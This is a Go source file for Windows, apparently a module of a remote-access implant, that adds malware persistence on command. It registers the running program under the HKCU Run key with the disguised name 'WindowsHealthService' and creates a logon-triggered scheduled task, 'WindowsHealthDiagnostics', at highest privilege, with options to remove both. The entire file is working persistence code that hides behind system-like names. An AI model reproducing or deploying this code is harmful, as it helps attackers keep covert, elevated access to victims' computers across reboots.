//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

const (
	HKEY_CURRENT_USER = 0x80000001
	KEY_WRITE         = 0x20006
	REG_SZ            = 1
)

func persistRegistry(remove bool) string {
	exe, err := os.Executable()
	if err != nil {
		return "Error: " + err.Error()
	}

	subKey, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)
	valueName, _ := syscall.UTF16PtrFromString("WindowsHealthService")

	regOpen := getProc(mAdvapi32, fRegOpenKeyExW)
	regClose := getProc(mAdvapi32, fRegCloseKey)

	var hKey syscall.Handle
	ret, _, _ := syscall.SyscallN(regOpen,
		uintptr(HKEY_CURRENT_USER),
		uintptr(unsafe.Pointer(subKey)),
		0,
		uintptr(KEY_WRITE),
		uintptr(unsafe.Pointer(&hKey)),
	)
	if ret != 0 {
		return fmt.Sprintf("Error: RegOpenKeyEx failed (0x%x)", ret)
	}
	defer syscall.SyscallN(regClose, uintptr(hKey))

	if remove {
		regDel := getProc(mAdvapi32, fRegDeleteValueW)
		ret, _, _ = syscall.SyscallN(regDel,
			uintptr(hKey),
			uintptr(unsafe.Pointer(valueName)),
		)
		if ret != 0 {
			return fmt.Sprintf("Error: RegDeleteValue failed (0x%x)", ret)
		}
		return "Registry run key removed"
	}

	regSet := getProc(mAdvapi32, fRegSetValueExW)
	valueData, _ := syscall.UTF16FromString(exe)
	dataSize := uint32(len(valueData) * 2)
	ret, _, _ = syscall.SyscallN(regSet,
		uintptr(hKey),
		uintptr(unsafe.Pointer(valueName)),
		0,
		uintptr(REG_SZ),
		uintptr(unsafe.Pointer(&valueData[0])),
		uintptr(dataSize),
	)
	if ret != 0 {
		return fmt.Sprintf("Error: RegSetValueEx failed (0x%x)", ret)
	}
	return fmt.Sprintf("Registry run key set: HKCU\\...\\Run\\WindowsHealthService -> %s", exe)
}

func persistScheduledTask(remove bool) string {
	taskName := "WindowsHealthDiagnostics"

	if remove {
		out, err := exec.Command("schtasks", "/Delete", "/TN", taskName, "/F").CombinedOutput()
		if err != nil {
			return "Error: " + strings.TrimSpace(string(out))
		}
		return "Scheduled task removed: " + taskName
	}

	exe, err := os.Executable()
	if err != nil {
		return "Error: " + err.Error()
	}

	out, err := exec.Command("schtasks", "/Create",
		"/TN", taskName,
		"/TR", exe,
		"/SC", "ONLOGON",
		"/RL", "HIGHEST",
		"/F",
	).CombinedOutput()
	if err != nil {
		return "Error: " + strings.TrimSpace(string(out))
	}
	return fmt.Sprintf("Scheduled task created: %s (ONLOGON, HIGHEST)", taskName)
}

func handlePersist(args string) string {
	parts := strings.Fields(args)
	if len(parts) == 0 {
		return persistRegistry(false)
	}

	method := strings.ToLower(parts[0])
	remove := len(parts) > 1 && strings.ToLower(parts[1]) == "remove"

	switch method {
	case "registry", "reg", "run":
		return persistRegistry(remove)
	case "schtask", "task":
		return persistScheduledTask(remove)
	case "remove", "clean":
		reg := persistRegistry(true)
		task := persistScheduledTask(true)
		return reg + "\n" + task
	default:
		return "Usage: persist [registry|schtask|remove]"
	}
}
